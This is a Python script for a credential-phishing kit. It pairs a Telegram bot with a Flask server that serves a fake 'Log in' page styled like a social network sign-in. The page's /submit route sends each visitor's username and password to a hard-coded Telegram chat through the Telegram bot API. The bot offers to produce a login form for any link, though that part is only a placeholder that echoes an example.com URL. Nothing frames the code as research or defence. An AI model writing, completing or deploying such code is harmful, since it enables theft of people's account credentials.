import logging
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters
from flask import Flask, request
import requests
from threading import Thread

# Set up logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
                    level=logging.INFO)
logger = logging.getLogger(__name__)

# Flask app setup
app = Flask(__name__)

# Store your bot's API token and admin ID
API_TOKEN = 'YOUR_API_TOKEN'  # Replace with your bot's token
ADMIN_ID = 1982693546  # Replace with your admin Telegram ID

# HTML template for the login page
html_template = """
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Log in</title>
  <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gradient-to-b from-black via-gray-900 to-gray-800 text-white flex items-center justify-center min-h-screen">

  <div class="w-full max-w-sm p-6 space-y-6">
    <div class="text-center text-gray-400 text-sm">
      English (US)
    </div>
    <div class="flex justify-center">
      <div class="w-16 h-16">
        <img src="https://envs.sh/sk5.png" alt="random Logo" class="w-full h-full">
      </div>
    </div>

    <form action="/submit" method="post" class="space-y-4">
      <div class="space-y-2">
        <input name="username" type="text" placeholder="Mobile number or email" class="w-full bg-gray-800 border border-gray-700 rounded-md text-sm p-3 placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-blue-500">
        <input name="password" type="password" placeholder="Password" class="w-full bg-gray-800 border border-gray-700 rounded-md text-sm p-3 placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-blue-500">
      </div>
      <button type="submit" class="w-full bg-blue-600 text-white font-medium py-2 rounded-md hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2 focus:ring-offset-gray-900">
        Log in
      </button>
    </form>
    
    <div class="text-center space-y-3">
      <a href="https://example.com/reset-password" class="text-blue-500 text-sm hover:underline">Forgot password?</a>
      <hr class="border-gray-700">
      <a href="https://example.com/create-account" class="w-full block bg-transparent border border-blue-500 text-blue-500 font-medium py-2 rounded-md text-center hover:bg-blue-700 hover:text-white focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2 focus:ring-offset-gray-900">
        Create new account
      </a>
    </div>

    <div class="text-center space-y-2">
      <div class="text-gray-500 text-sm">© YourWebsiteName</div>
      <div class="text-gray-500 text-xs flex justify-center space-x-3">
        <a href="https://example.com/about" class="hover:underline">About</a>
        <a href="https://example.com/help" class="hover:underline">Help</a>
        <a href="https://example.com/more" class="hover:underline">More</a>
      </div>
    </div>
  </div>

</body>
</html>
"""

# Command to start the bot
async def start(update: Update, context):
    await update.message.reply_text("Send me any link, and I'll generate a login form for you.")

# Handling user message and creating the HTML page
async def handle_message(update: Update, context):
    link = update.message.text
    # Send the link as part of the response
    await update.message.reply_text(f"Here is your login page: {link}")

    # Assuming you want to redirect to the page and use the provided link
    page_url = f"https://example.com/create-login-form?redirect={link}"
    await update.message.reply_text(page_url)

# Flask route to handle form submission
@app.route('/submit', methods=['POST'])
def submit():
    username = request.form['username']
    password = request.form['password']
    
    # Send the details to the admin
    message = f"Username: {username}\nPassword: {password}"
    requests.post(f"https://api.telegram.org/bot{API_TOKEN}/sendMessage", 
                  data={'chat_id': ADMIN_ID, 'text': message})
    
    return "Form submitted successfully!"

# Function to run the bot
def start_bot():
    application = Application.builder().token(API_TOKEN).build()

    # Add handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    # Start the bot
    application.run_polling()

# Run both the Flask app and the Telegram bot
def main():
    # Start the bot in a separate thread
    bot_thread = Thread(target=start_bot)
    bot_thread.start()

    # Run the Flask web server
    app.run(host='0.0.0.0', port=5000)

if __name__ == '__main__':
    main()
    
